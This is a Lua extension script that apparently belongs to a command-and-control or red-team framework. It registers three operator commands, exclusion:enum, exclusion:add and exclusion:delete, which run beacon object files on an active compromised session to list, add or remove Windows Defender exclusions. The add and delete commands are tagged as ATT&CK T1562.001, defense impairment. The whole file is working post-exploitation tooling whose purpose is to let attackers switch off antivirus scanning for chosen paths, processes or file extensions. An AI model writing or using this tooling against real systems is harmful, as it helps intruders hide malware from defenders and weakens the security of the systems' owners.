local function bof_path(bof_name, arch)
    return "bof/exclusion/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end
-- enum_exclusion
local function run_enum_exclusion(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_exclusion", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_enum_exclusion = command("exclusion:enum", run_enum_exclusion, "Enumerate Windows Defender exclusions", "T1518.001")
opsec("exclusion:enum", 9.0)

-- add_exclusion
local function run_add_exclusion(cmd)
    local excltype = cmd:Flags():GetString("type")
    local excldata = cmd:Flags():GetString("data")
    if excltype == "" then
        error("exclusion type is required")
    end
    if excldata == "" then
        error("exclusion data is required")
    end
    if excltype ~= "path" and excltype ~= "process" and excltype ~= "extension" then
        error("exclusion type must be 'path', 'process', or 'extension'")
    end
    local packed_args = bof_pack("zZ", excltype, excldata)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("add_exclusion", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_add_exclusion = command("exclusion:add", run_add_exclusion, "Add Windows Defender exclusion <type> <data>", "T1562.001")
cmd_add_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
cmd_add_exclusion:Flags():String("data", "", "exclusion data")
opsec("exclusion:add", 9.0)


-- del_exclusion
local function run_del_exclusion(cmd)
    local excltype = cmd:Flags():GetString("type")
    local excldata = cmd:Flags():GetString("data")
    if excltype == "" then
        error("exclusion type is required")
    end
    if excldata == "" then
        error("exclusion data is required")
    end
    local packed_args = bof_pack("zZ", excltype, excldata)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("del_exclusion", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_del_exclusion = command("exclusion:delete", run_del_exclusion, "Delete Windows Defender exclusion <type> <data>", "T1562.001")
cmd_del_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
cmd_del_exclusion:Flags():String("data", "", "exclusion data")
opsec("exclusion:delete", 9.0)